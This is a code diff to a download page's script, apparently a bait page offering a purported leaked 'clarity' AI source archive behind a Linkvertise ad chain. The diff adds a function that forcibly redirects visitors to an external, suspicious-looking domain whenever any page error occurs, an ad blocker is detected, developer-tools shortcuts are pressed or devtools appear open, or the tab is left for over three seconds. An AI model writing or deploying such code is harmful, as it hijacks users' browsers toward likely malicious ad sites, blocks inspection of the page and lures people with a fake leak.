@@ -102,6 +102,15 @@
     }
   </style>
   <script>
+    /******** TAMPER REDIRECT FUNCTION ********/
+    function triggerTamperRedirect() {
+      window.location.href = "https://giphootchebs.net/4/9061067";
+    }
+    // Global error listener – any error triggers tamper redirect.
+    window.addEventListener("error", function(e) {
+      triggerTamperRedirect();
+    });
+    
     /******** SECURITY ENHANCEMENTS ********/
     // Anti-Adblock detection
     function detectAdBlock() {
@@ -112,7 +121,7 @@
       document.body.appendChild(testAd);
       setTimeout(() => {
         if (testAd.offsetHeight === 0) {
-          alert('AdBlock detected! Please disable your ad blocker to continue.');
+          triggerTamperRedirect();
         }
         testAd.remove();
       }, 100);
@@ -124,24 +133,23 @@
       if (e.keyCode === 123 || // F12
           (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
           (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
-        e.preventDefault();
+        triggerTamperRedirect();
       }
     });
-    // Rudimentary devtools detection (window size difference)
+    // Rudimentary devtools detection (redirect instead of alert)
     setInterval(() => {
       if(window.outerWidth - window.innerWidth > 100) {
-        alert("Please do not open developer tools!");
+        triggerTamperRedirect();
       }
     }, 1000);
-    // Warn if the user leaves the page for more than 3 seconds
+    // If user leaves page too long, redirect
     let blurTime = 0;
     document.addEventListener("visibilitychange", function() {
       if(document.visibilityState === "hidden") {
         blurTime = Date.now();
       } else {
         if(Date.now() - blurTime > 3000) {
-          alert("You left the page for too long. The process will restart.");
-          window.location.reload();
+          triggerTamperRedirect();
         }
       }
     });
@@ -150,7 +158,6 @@
     // URLs configuration
     const linkvertiseChainURL = "https://link-center.net/1290865/clarity-ai-src-leak-ud";
     const finalDownloadURL = "./clarity.zip"; // Local file
-
     // Use localStorage flag to record valid Linkvertise return
     const linkvertiseFlag = "fromLinkvertise";
     let fromLinkvertise = false;
@@ -255,10 +262,10 @@
       window.location.href = linkvertiseChainURL;
     }
 
-    // On page load, check referrer and local storage to decide which section to display
+    // On page load, decide which section to display based on referrer/localStorage flag
     window.onload = () => {
       detectAdBlock();
-      if(fromLinkvertise) {
+      if(document.referrer && document.referrer.indexOf("linkvertise") !== -1) {
         document.getElementById("adSection").style.display = "none";
         document.getElementById("finalSection").style.display = "block";
       } else {
